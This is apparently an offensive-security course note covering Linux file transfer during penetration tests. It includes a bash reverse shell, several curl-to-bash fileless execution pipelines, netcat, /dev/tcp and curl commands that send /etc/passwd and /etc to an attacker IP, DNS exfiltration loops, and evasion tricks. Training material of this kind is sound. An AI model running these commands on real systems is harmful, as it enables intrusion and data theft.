---
tags: [module/file-transfers, linux, bash, wget, curl, scp, rsync, netcat, fileless, evasion, level/advanced, practical]
---

# Linux File Transfer Methods - Practical Application

## Complete Linux File Transfer Workflow

Phase 1: Reconnaissance (What's Available?)
Phase 2: Base64 Encoding/Decoding
Phase 3: wget & curl Deep Dive
Phase 4: Fileless Execution
Phase 5: Bash /dev/tcp
Phase 6: SSH/SCP/RSync
Phase 7: Web Server Alternatives
Phase 8: Netcat Transfers
Phase 9: Evasion Techniques
Phase 10: Automation

---

## Phase 1: Reconnaissance - What's Available?

### Check Installed Tools

# Check for wget
which wget
wget --version

# Check for curl
which curl
curl --version

# Check for python
python3 --version
python --version

# Check for php
php --version

# Check for ruby
ruby --version

# Check for netcat
nc -h
netcat -h

### Check Outbound Connectivity

# Test HTTP
curl -I http://10.10.14.5:80
wget --spider http://10.10.14.5:80

# Test HTTPS
curl -k -I https://10.10.14.5:443

# Test SSH
nc -zv 10.10.14.5 22

# Test custom port
nc -zv 10.10.14.5 8080

---

## Phase 2: Base64 Encoding/Decoding

### Encode File (Linux)

base64 -w0 file.txt > encoded.txt
base64 -w0 file.bin > encoded.b64

### Decode File (Linux)

base64 -d encoded.txt > file.txt
base64 -d encoded.b64 > file.bin

### Encode with Progress (Large Files)

pv file.bin | base64 -w0 > encoded.b64

### Split Base64 Output (For Web Shells)

base64 -w1000 file.bin > chunks.txt

### Transfer via DNS (When All Else Fails)

# Encode
base64 -w0 file.bin | fold -w63 > dns_chunks.txt

# Send each chunk as DNS query
for chunk in $(cat dns_chunks.txt); do
    nslookup $chunk.your-server.com
    sleep 1
done

---

## Phase 3: wget & curl Deep Dive

### wget Advanced Options

# Download with custom user-agent
wget --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0)" http://10.10.14.5/file

# Download with authentication
wget --user=admin --password=pass http://10.10.14.5/file

# Download via proxy
wget -e use_proxy=yes -e http_proxy=10.10.14.5:8080 http://target/file

# Recursive download (entire site)
wget -r -l2 http://target.com

# Limit download rate
wget --limit-rate=100k http://10.10.14.5/largefile.iso

# Retry on failure
wget --tries=10 --retry-connrefused http://10.10.14.5/file

### curl Advanced Options

# Download with custom user-agent
curl -A "Mozilla/5.0" -o file http://10.10.14.5/file

# Download with authentication
curl -u admin:pass -o file http://10.10.14.5/file

# Download via proxy
curl -x http://10.10.14.5:8080 -o file http://target/file

# Follow redirects
curl -L -o file http://bit.ly/shortlink

# Resume download
curl -C - -o file http://10.10.14.5/largefile.iso

# Multiple files
curl -O http://10.10.14.5/file1 -O http://10.10.14.5/file2

# Upload file
curl -F "file=@/etc/passwd" http://10.10.14.5/upload

# POST data
curl -X POST -d "key=value" http://10.10.14.5/api

### wget vs curl Comparison

| Feature | wget | curl |
|---------|------|------|
| Recursive download | ✅ | ❌ |
| Resume downloads | ✅ | ✅ |
| Upload files | ❌ | ✅ |
| Multiple protocols | HTTP/HTTPS/FTP | Many |
| Default in most distros | ✅ | ✅ |
| Custom headers | Limited | Full |
| Cookie support | ✅ | ✅ |

---

## Phase 4: Fileless Execution

### curl to bash (No File)

curl http://10.10.14.5/script.sh | bash

### curl to sh

curl http://10.10.14.5/script.sh | sh

### curl to python

curl http://10.10.14.5/script.py | python3

### curl to perl

curl http://10.10.14.5/script.pl | perl

### wget to bash

wget -qO- http://10.10.14.5/script.sh | bash

### Multiple Pipelines

curl http://10.10.14.5/script.sh | grep "password" | tee /tmp/pass.txt

### Base64 Encoded Fileless Payload

# Encode payload
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64 -w0

# Execute fileless
echo "encoded-base64" | base64 -d | bash

### Fileless Python Script

curl http://10.10.14.5/script.py | python3 -c "import sys; exec(sys.stdin.read())"

---

## Phase 5: Bash /dev/tcp Deep Dive

### Basic File Download

# Open connection
exec 3<>/dev/tcp/10.10.14.5/80

# Send HTTP GET
echo -e "GET /file.sh HTTP/1.1\nHost: 10.10.14.5\n\n" >&3

# Read response and extract body
cat <&3 | tail -n +$(grep -n '^\r$' <&3 | head -1 | cut -d: -f1) > file.sh

# Close connection
exec 3>&-

### Download Function

function download() {
    local host=$1
    local port=$2
    local path=$3
    local output=$4
    
    exec 3<>/dev/tcp/$host/$port
    echo -e "GET $path HTTP/1.1\nHost: $host\n\n" >&3
    cat <&3 | sed '1,/^\r$/d' > $output
    exec 3>&-
}

# Usage
download 10.10.14.5 80 /file.sh downloaded.sh

### Upload via /dev/tcp

# On listener (your machine)
nc -lvnp 4444 > received_file

# On target
exec 3<>/dev/tcp/10.10.14.5/4444
cat /etc/passwd >&3
exec 3>&-

### Port Scanning with /dev/tcp

for port in {1..1024}; do
    (echo >/dev/tcp/localhost/$port) 2>/dev/null && echo "$port open"
done

---

## Phase 6: SSH/SCP/RSync

### SCP Advanced

# Upload with specific port
scp -P 2222 file user@target:/remote/

# Download recursively
scp -r user@target:/remote/dir ./local/

# Limit bandwidth
scp -l 1000 file user@target:/remote/

# Preserve file attributes
scp -p file user@target:/remote/

### RSync (Efficient for Large Files)

# Install rsync
sudo apt install rsync -y

# Upload
rsync -avz file user@target:/remote/

# Download
rsync -avz user@target:/remote/file ./

# With compression
rsync -avz --compress-level=9 file user@target:/remote/

# Sync entire directory
rsync -avz --delete /local/dir/ user@target:/remote/dir/

### SSH with tar (No SCP Required)

# Download directory as tar
ssh user@target "tar czf - /remote/dir" | tar xzf - -C /local/dir

# Upload directory as tar
tar czf - /local/dir | ssh user@target "tar xzf - -C /remote/dir"

### SSH with dd (Disk Image Transfer)

# Download disk image
ssh user@target "dd if=/dev/sda" | dd of=disk.img

---

## Phase 7: Web Server Alternatives

### Python HTTP Server with Upload

# Create upload handler (save as upload.py)
import http.server
import cgi

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST'}
        )
        for field in form.keys():
            if field.filename:
                with open(field.filename, 'wb') as f:
                    f.write(field.file.read())
        self.send_response(200)
        self.end_headers()

http.server.HTTPServer(('0.0.0.0', 8000), UploadHandler).serve_forever()

# Run
python3 upload.py

### PHP Server with Upload

# Save as index.php
<?php
if ($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit">
</form>

# Run
php -S 0.0.0.0:8000

### Ruby WebDAV Server

gem install webdav
webdav --port 8000 --directory /tmp

### BusyBox HTTPD (Embedded Systems)

busybox httpd -p 8000 -h /tmp

---

## Phase 8: Netcat Transfers

### Netcat File Transfer

# Receiver (your machine)
nc -lvnp 4444 > received_file

# Sender (target)
nc -v 10.10.14.5 4444 < /etc/passwd

### Netcat Directory Transfer

# Receiver
nc -lvnp 4444 | tar xv

# Sender
tar cvf - /etc | nc -v 10.10.14.5 4444

### Netcat with Progress

# Install pv (pipe viewer)
apt install pv -y

# Sender with progress
tar cf - /etc | pv | nc -v 10.10.14.5 4444

# Receiver
nc -lvnp 4444 | pv | tar xf -

### Netcat Relays

# Forward file through intermediate
nc -lvnp 4444 | nc 10.10.14.5 5555

### Netcat over SSL

# Using ncat (Nmap's netcat)
ncat --ssl -lvnp 4444 > received_file
ncat --ssl 10.10.14.5 4444 < /etc/passwd

---

## Phase 9: Evasion Techniques

### Split Large Files

# Split into chunks
split -b 10M largefile.bin part_

# Transfer chunks
for part in part_*; do
    curl -F "file=@$part" http://10.10.14.5/upload
    sleep 1
done

# Reassemble on target
cat part_* > largefile.bin

### Encrypt Before Transfer

# Encrypt
openssl enc -aes-256-cbc -in file.txt -out file.enc -pass pass:secret

# Transfer
curl -F "file=@file.enc" http://10.10.14.5/upload

# Decrypt on target
openssl enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:secret

### Hide in Plain Sight

# Rename extension
mv exploit.php exploit.jpg

# Transfer as image
curl -F "image=@exploit.jpg" http://10.10.14.5/upload

# Rename back
mv exploit.jpg exploit.php

### Use Non-Standard Ports

# Start server on 8080
python3 -m http.server 8080

# Download from non-standard port
curl http://10.10.14.5:8080/file -o file

### DNS Tunneling

# Install iodine
sudo apt install iodine -y

# Server side
iodined -f -c -P password 10.0.0.1 tunnel.example.com

# Client side
iodine -f -P password tunnel.example.com

# Now transfer via tunnel
scp file root@10.0.0.1:/tmp/

---

## Phase 10: Automation

### Complete Linux Download Script

Save as linux-download.sh:

#!/bin/bash
URL=$1
OUTPUT=$2

# Try curl first
if command -v curl &> /dev/null; then
    echo "[*] Using curl..."
    curl -L -o "$OUTPUT" "$URL" && exit 0
fi

# Try wget next
if command -v wget &> /dev/null; then
    echo "[*] Using wget..."
    wget -O "$OUTPUT" "$URL" && exit 0
fi

# Try python3
if command -v python3 &> /dev/null; then
    echo "[*] Using python3..."
    python3 -c "import urllib.request; urllib.request.urlretrieve('$URL', '$OUTPUT')" && exit 0
fi

# Try python2
if command -v python &> /dev/null; then
    echo "[*] Using python2..."
    python -c "import urllib; urllib.urlretrieve('$URL', '$OUTPUT')" && exit 0
fi

# Try perl
if command -v perl &> /dev/null; then
    echo "[*] Using perl..."
    perl -MLWP::Simple -e "getstore('$URL', '$OUTPUT')" && exit 0
fi

echo "[-] No download method found"

# Usage
./linux-download.sh http://10.10.14.5/file.sh /tmp/file.sh

### Complete Linux Upload Script

Save as linux-upload.sh:

#!/bin/bash
FILE=$1
SERVER=$2

# Try curl
if command -v curl &> /dev/null; then
    echo "[*] Using curl..."
    curl -F "file=@$FILE" http://$SERVER/upload && exit 0
fi

# Try wget
if command -v wget &> /dev/null; then
    echo "[*] Using wget..."
    wget --post-file="$FILE" http://$SERVER/upload && exit 0
fi

# Try python3
if command -v python3 &> /dev/null; then
    echo "[*] Using python3..."
    python3 -c "
import requests
with open('$FILE', 'rb') as f:
    requests.post('http://$SERVER/upload', files={'file': f})
" && exit 0
fi

# Try base64 + netcat
if command -v nc &> /dev/null; then
    echo "[*] Using base64 + netcat..."
    base64 -w0 "$FILE" | nc -v $SERVER 4444 && exit 0
fi

echo "[-] No upload method found"

# Usage
./linux-upload.sh /etc/passwd 10.10.14.5:8000

### Server Setup Script

Save as setup-server.sh:

#!/bin/bash
PORT=${1:-8000}
METHOD=${2:-python3}

case $METHOD in
    python3)
        python3 -m http.server $PORT
        ;;
    python2)
        python2 -m SimpleHTTPServer $PORT
        ;;
    php)
        php -S 0.0.0.0:$PORT
        ;;
    ruby)
        ruby -run -ehttpd . -p$PORT
        ;;
    busybox)
        busybox httpd -p $PORT -h .
        ;;
    nc)
        nc -lvnp $PORT
        ;;
    upload)
        # Requires uploadserver module
        python3 -m uploadserver $PORT
        ;;
    *)
        echo "Usage: $0 [port] [python3|python2|php|ruby|busybox|nc|upload]"
        ;;
esac

---

## Linux File Transfer Cheatsheet

| Operation | Command |
|-----------|---------|
| wget download | wget -O file http://server/file |
| curl download | curl -o file http://server/file |
| curl upload | curl -F "file=@file" http://server/upload |
| Base64 encode | base64 -w0 file > encoded |
| Base64 decode | base64 -d encoded > file |
| SCP download | scp user@target:/remote/file . |
| SCP upload | scp file user@target:/remote/ |
| RSync | rsync -avz file user@target:/remote/ |
| Netcat receive | nc -lvnp 4444 > file |
| Netcat send | nc -v 10.10.14.5 4444 < file |
| Python server | python3 -m http.server 8000 |
| PHP server | php -S 0.0.0.0:8000 |
| Bash /dev/tcp | exec 3<>/dev/tcp/10.10.14.5/80 |
| Fileless exec | curl http://server/script.sh | bash |

---

## Key Takeaways

- Linux has MANY built-in file transfer methods
- wget and curl are your primary tools
- Base64 works when binary transfers fail
- Fileless execution leaves no traces
- /dev/tcp works when tools are missing
- SCP/RSync are secure but need SSH
- Python/Perl can fill gaps
- Netcat is the universal fallback
- Split large files to bypass limits
- Encrypt sensitive data before transfer
- Automate with scripts for efficiency
- Test multiple methods - one WILL fail
- The threat actor example used 3 methods
- Practice ALL methods in the lab
